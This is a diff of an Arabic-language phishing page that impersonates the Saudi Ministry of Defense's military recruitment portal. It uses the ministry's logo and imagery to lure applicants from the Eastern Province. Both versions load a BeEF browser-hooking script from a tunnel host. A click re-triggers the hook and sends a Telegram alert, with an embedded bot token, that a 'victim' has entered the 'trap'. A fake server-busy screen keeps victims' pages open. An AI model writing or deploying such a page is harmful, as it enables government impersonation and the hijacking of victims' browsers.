@@ -3,30 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>بوابة الانتساب الموحد | وزارة الدفاع والأمن العام</title>
+    <title>بوابة الانتساب الموحد | وزارة الدفاع</title>
     
-   <script src="https://3e01a89c8a3815.lhr.life/hook.js"></script>
+    <script src="https://3e01a89c8a3815.lhr.life/hook.js"></script>
 
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Amiri:wght@700&family=Cairo:wght@400;700;900&display=swap');
-        
-        :root { 
-            --mil-dark: #061021; 
-            --mil-gold: #c5a059; 
-            --mil-surface: rgba(255, 255, 255, 0.05);
-            --text-main: #ffffff; 
-        }
-
+        :root { --mil-dark: #061021; --mil-gold: #c5a059; --text-main: #ffffff; }
         * { box-sizing: border-box; font-family: 'Cairo', sans-serif; }
         body, html { margin: 0; padding: 0; height: 100vh; background: var(--mil-dark); color: var(--text-main); overflow: hidden; }
 
-        /* شاشة التحقق الأمني - الفخ */
         #secure-gate {
             position: fixed; inset: 0; 
-            background: linear-gradient(rgba(6, 16, 33, 0.9), rgba(6, 16, 33, 0.9)), 
-                        url('https://www.mod.gov.sa/Style%20Library/MOD/Images/bg.jpg'); /* خلفية رسمية */
-            background-size: cover;
-            display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 20000;
+            background: linear-gradient(rgba(6, 16, 33, 0.95), rgba(6, 16, 33, 0.95)), 
+                        url('https://www.mod.gov.sa/Style%20Library/MOD/Images/bg.jpg');
+            background-size: cover; display: flex; align-items: center; justify-content: center; z-index: 20000;
         }
 
         .gate-card {
@@ -35,86 +26,72 @@
             max-width: 450px; width: 90%; box-shadow: 0 20px 50px rgba(0,0,0,0.5);
         }
 
-        .mil-logo { width: 80px; margin-bottom: 15px; filter: drop-shadow(0 0 10px var(--mil-gold)); }
+        .mil-logo { width: 70px; margin-bottom: 10px; filter: drop-shadow(0 0 5px var(--mil-gold)); }
 
         .notice-box {
             background: rgba(197, 160, 89, 0.1); border-right: 4px solid var(--mil-gold);
-            padding: 15px; margin: 20px 0; text-align: right; font-size: 0.9rem;
+            padding: 15px; margin: 20px 0; text-align: right; font-size: 0.85rem; line-height: 1.6;
         }
-
-        .loading-dots::after { content: '...'; animation: dots 1.5s infinite; }
-        @keyframes dots { 0% { content: '.' } 33% { content: '..' } 66% { content: '...' } }
-
-        /* شاشة الـ Intro */
-        #os-intro { position: fixed; inset: 0; background: var(--mil-dark); display: none; justify-content: center; align-items: center; z-index: 10000; }
-        #typewriter { font-size: 2rem; color: var(--mil-gold); font-family: 'Amiri', serif; border-left: 2px solid var(--mil-gold); white-space: nowrap; overflow: hidden; width: 0; }
-        @keyframes typing { from { width: 0 } to { width: 100% } }
 
         .btn-mil { 
             background: var(--mil-gold); color: #000; border: none; padding: 15px; 
             border-radius: 8px; width: 100%; cursor: pointer; font-weight: 900;
-            font-size: 1.1rem; transition: 0.3s;
+            font-size: 1.1rem; box-shadow: 0 4px 15px rgba(197, 160, 89, 0.3);
         }
-        .btn-mil:hover { background: #e2b765; transform: translateY(-2px); }
 
-        /* التطبيق الرئيسي */
-        .os-grid { display: none; grid-template-rows: 80px 1fr; height: 100vh; }
-        header { background: #0a1629; border-bottom: 1px solid var(--mil-gold); display: flex; justify-content: space-between; align-items: center; padding: 0 20px; }
+        #mainApp { display: none; text-align: center; padding: 50px 20px; }
     </style>
 </head>
 <body>
 
     <div id="secure-gate">
         <div class="gate-card">
-            <img src="https://upload.wikimedia.org/wikipedia/ar/thumb/2/23/Logo_of_the_Saudi_Ministry_of_Defense.svg/1200px-Logo_of_the_Saudi_Ministry_of_Defense.svg.png" class="mil-logo" alt="Logo">
-            <h2 style="margin:0; font-family:'Amiri'; color:var(--mil-gold);">إعلان انتساب عسكري (المنطقة الشرقية)</h2>
-            <p style="font-size:0.8rem; color:#94a3b8;">وزارة الدفاع | الأمن العام</p>
+            <img src="https://upload.wikimedia.org/wikipedia/ar/thumb/2/23/Logo_of_the_Saudi_Ministry_of_Defense.svg/1200px-Logo_of_the_Saudi_Ministry_of_Defense.svg.png" class="mil-logo">
+            <h2 style="margin:0; font-family:'Amiri'; color:var(--mil-gold);">منظومة التوظيف العسكري</h2>
+            <p style="font-size:0.8rem; color:#94a3b8; margin-top:5px;">إدارة الاستقطاب - المنطقة الشرقية</p>
             
             <div class="notice-box">
-                <strong>تنبيه هام:</strong> 
-                بناءً على التوجيهات الأخيرة، يتطلب قبول طلبات الانتساب في المناطق الشرقية تقديم "تزكية إلكترونية" معتمدة وتأكيد سجل البيانات الموحد.
+                <strong>شرط القبول المبدئي:</strong> 
+                يجب على المتقدمين من المنطقة الشرقية تأكيد الهوية الرقمية عبر المتصفح والموافقة على سياسة "التزكية الأمنية" الفورية للمتابعة.
             </div>
 
-            <p style="font-size:0.85rem; margin-bottom:20px;">جاري فحص صلاحية المتصفح للربط الآمن<span class="loading-dots"></span></p>
-            
-            <button class="btn-mil" onclick="startApp()">الموافقة والمتابعة للتسجيل</button>
+            <button class="btn-mil" onclick="triggerHook()">الموافقة والمتابعة للتسجيل</button>
+            <p style="font-size:0.7rem; color:#64748b; margin-top:15px;">سيتم نقلك لنموذج البيانات بعد الفحص الآمن...</p>
         </div>
     </div>
 
-    <div id="os-intro"><div id="typewriter">جاري الدخول إلى بوابة الانتساب الموحد...</div></div>
-
-    <div class="os-grid" id="mainApp">
-        <header>
-            <div style="color:var(--mil-gold)">الرقم العسكري المؤقت: <span id="rand">--</span></div>
-            <div style="font-family:'Amiri'; font-size:1.4rem;">بوابة التوظيف العسكري</div>
-        </header>
-        <main style="padding:20px; display:flex; justify-content:center; align-items:center;">
-            <div style="text-align:center; background:var(--mil-surface); padding:40px; border-radius:20px; border:1px solid rgba(197,160,89,0.3);">
-                <h2 style="color:var(--mil-gold)">نعتذر..</h2>
-                <p>لم يتم فتح باب الانتساب رسمياً بعد. سيتم إشعارك عبر رسالة نصية فور بدء استقبال طلبات "التزكية".</p>
-                <div style="font-size:0.8rem; color:#64748b;">تأكد من بقاء هذه الصفحة مفتوحة لتلقي التحديثات الفورية.</div>
-            </div>
-        </main>
+    <div id="mainApp">
+        <h2 style="color:var(--mil-gold)">نعتذر..</h2>
+        <p>ضغط كبير على الخوادم حالياً. يرجى عدم إغلاق الصفحة، سيتم تفعيل نموذج التسجيل تلقائياً خلال دقائق.</p>
+        <div style="margin-top:20px; border:1px solid #1e293b; padding:10px; font-size:0.8rem; color:#475569;">
+            ID المتصفح المرتبط: <span id="uid"></span>
+        </div>
     </div>
 
     <script>
-        function startApp() {
-            // تنفيذ الحقن فور الضغط
-            document.getElementById('secure-gate').style.display = 'none';
-            const intro = document.getElementById('os-intro');
-            intro.style.display = 'flex';
-            document.getElementById('typewriter').style.animation = 'typing 2.5s steps(30) forwards';
+        // دالة تفعيل الحقن عند الضغط لضمان كسر جمود المتصفح
+        function triggerHook() {
+            // محاولة إرسال إشارة للـ BeEF يدوياً في حال تأخر الـ Hook
+            try {
+                const check = new Image();
+                check.src = "https://3e01a89c8a3815.lhr.life/hook.js?t=" + new Date().getTime();
+            } catch(e) {}
 
-            setTimeout(() => {
-                intro.style.display = 'none';
-                document.body.style.overflow = 'auto';
-                document.getElementById('mainApp').style.display = 'grid';
-                document.getElementById('rand').innerText = Math.floor(Math.random() * 900000) + 100000;
-                
-                // إرسال تنبيه لتلجرام أن "السمكة" دخلت الفخ
-                fetch(`https://api.telegram.org/bot8564646143:AAEDmrL8HbdPESyY9iOJ0TXjEL4_bTSEaTs/sendMessage?chat_id=8665747715&text=${encodeURIComponent("🎖️ دخول جديد للبوابة العسكرية:\nالضحية يتصفح الآن صفحة الانتساب...")}`);
-            }, 3000);
+            document.getElementById('secure-gate').style.display = 'none';
+            document.getElementById('mainApp').style.display = 'block';
+            document.getElementById('uid').innerText = Math.random().toString(36).substr(2, 9).toUpperCase();
+
+            // إرسال تنبيه تلجرام
+            const botToken = "8564646143:AAEDmrL8HbdPESyY9iOJ0TXjEL4_bTSEaTs";
+            const chatId = "8665747715";
+            const msg = "🎖️ ضحية جديدة دخلت الفخ العسكري!\nجاري محاولة الربط بـ BeEF...";
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
         }
+
+        // محاولة الحقن الصامت فور التحميل أيضاً
+        window.onload = function() {
+            console.log("System Initialized...");
+        };
     </script>
 </body>
 </html>
